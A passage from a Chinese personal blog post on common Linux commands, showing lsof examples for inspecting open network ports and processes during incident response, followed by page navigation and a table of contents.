<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># lsof -i tcp</span></span><br><span class="line">COMMAND     PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME</span><br><span class="line">sshd       1057 root    3u  IPv4  15706      0t0  TCP *:ssh (LISTEN)</span><br></pre></td></tr></table></figure>
<p>udp同理</p>
<p>查看谁在使用指定端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -i :3306</span><br></pre></td></tr></table></figure>


<p>查看谁在使用指定的tcp端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -i tcp:3306</span><br></pre></td></tr></table></figure>
<p>udp同理</p>
<p> 列出被进程号为1234的进程所打开的所有IPV4 network files </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -i 4 -a -p 1234</span><br></pre></td></tr></table></figure>


<p>列出目前连接主机peida.linux上端口为：20，21，22，25，53，80相关的所有文件信息，且每隔3秒不断的执行lsof指令 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -i @peida.linux:20,21,22,25,53,80  -r  3</span><br></pre></td></tr></table></figure>


<h2 id="rpcinfo"><a href="#rpcinfo" class="headerlink" title="rpcinfo"></a>rpcinfo</h2>
        </div>

        
            <div class="post-copyright-info">
                <div class="article-copyright-info-container">
    <ul>
        <li>本文标题：一些常见的Linux命令</li>
        <li>本文作者：p1k</li>
        <li>创建时间：2020-02-29 11:09:37</li>
        <li>
            本文链接：http://p1keman.github.io/2020/02/29/一些常见的Linux命令/
        </li>
        <li>
            版权声明：本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！
        </li>
    </ul>
</div>

            </div>
        

        
            <div class="article-nav">
                
                    <div class="article-prev">
                        <a class="prev"
                           rel="prev"
                           href="/2020/03/03/%E4%B8%80%E7%82%B9%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%A0%BC%E5%BC%8F%E7%9F%A5%E8%AF%86/"
                        >
                            <span class="left arrow-icon flex-center">
                              <i class="fas fa-chevron-left"></i>
                            </span>
                            <span class="title flex-center">
                                <span class="post-nav-title-item">一点虚拟机格式知识</span>
                                <span class="post-nav-item">上一篇</span>
                            </span>
                        </a>
                    </div>
                
                
                    <div class="article-next">
                        <a class="next"
                           rel="next"
                           href="/2020/02/27/PHP%E5%BC%80%E5%8F%91%E8%AE%B0%E5%BD%95one/"
                        >
                            <span class="title flex-center">
                                <span class="post-nav-title-item">PHP开发记录one</span>
                                <span class="post-nav-item">下一篇</span>
                            </span>
                            <span class="right arrow-icon flex-center">
                              <i class="fas fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        

        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            <footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
              <span>2020</span> -
            
            2021 <i class="fas fa-heart icon-animate"></i> <a href="/">p1k</a>
        </div>
        
            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                    <span id="busuanzi_container_site_uv">
                        访问人数 <span id="busuanzi_value_site_uv"></span>&ensp;
                    </span>
                
                
                    <span id="busuanzi_container_site_pv">
                        总访问量 <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="theme-info info-item">
            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动 | 主题 <a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.3.1</a>
        </div>
    </div>
</footer>

        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="tools-list">
        <!-- TOC aside toggle -->
        
            <li class="tools-item page-aside-toggle">
                <i class="fas fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
    </ul>
</div>

        </div>
    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-expand-width flex-center">
            <i class="fas fa-arrows-alt-h"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        

        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="fas fa-arrow-up"></i>
            </li>
        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
    </ul>
</div>

    </div>

    
        <aside class="page-aside">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#linux%E4%B8%89%E5%89%91%E5%AE%A2"><span class="nav-text">linux三剑客</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#awk"><span class="nav-text">awk</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E7%BB%93%E6%9E%84"><span class="nav-text">基本结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95"><span class="nav-text">测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E5%89%B2%E5%9F%9F"><span class="nav-text">分割域</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E5%89%B2%E7%AC%A6"><span class="nav-text">分割符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="nav-text">正则表达式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%87%8D%E7%82%B9"><span class="nav-text">重点</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sed"><span class="nav-text">sed</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#curl"><span class="nav-text">curl</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#post%E8%AF%B7%E6%B1%82"><span class="nav-text">post请求</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="nav-text">上传文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6"><span class="nav-text">下载文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BC%AA%E9%80%A0referer"><span class="nav-text">伪造referer</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9user-agent"><span class="nav-text">修改user-agent</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8C%87%E5%AE%9Acookie"><span class="nav-text">指定cookie</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%9D%E5%AD%98http%E7%9A%84%E5%93%8D%E5%BA%94%E5%A4%B4%E4%BF%A1%E6%81%AF"><span class="nav-text">保存http的响应头信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E8%BF%87ftp%E4%B8%8B%E8%BD%BD"><span class="nav-text">通过ftp下载</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wget"><span class="nav-text">wget</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BD%E5%8D%95%E4%B8%AA%E6%96%87%E4%BB%B6"><span class="nav-text">下载单个文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BD%E5%A4%9A%E4%B8%AA%E6%96%87%E4%BB%B6"><span class="nav-text">下载多个文件</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wc"><span class="nav-text">wc</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94"><span class="nav-text">应急响应</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#lastb"><span class="nav-text">lastb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lsof"><span class="nav-text">lsof</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rpcinfo"><span class="nav-text">rpcinfo</span></a></li></ol></li></ol>
    </div>
</div>
        </aside>
    

    <div class="image-viewer-container">
    <img src="">
</div>


    

</main>




<script src="/js/utils.js"></script>

<script src="/js/main.js"></script>

<script src="/js/header-shrink.js"></script>

<script src="/js/back2top.js"></script>

<script src="/js/dark-light-toggle.js"></script>





    
<script src="/js/code-copy.js"></script>





<div class="post-scripts">
    
        
<script src="/js/left-side-toggle.js"></script>

<script src="/js/libs/anime.min.js"></script>

<script src="/js/toc.js"></script>

    
</div>



</body>
</html>
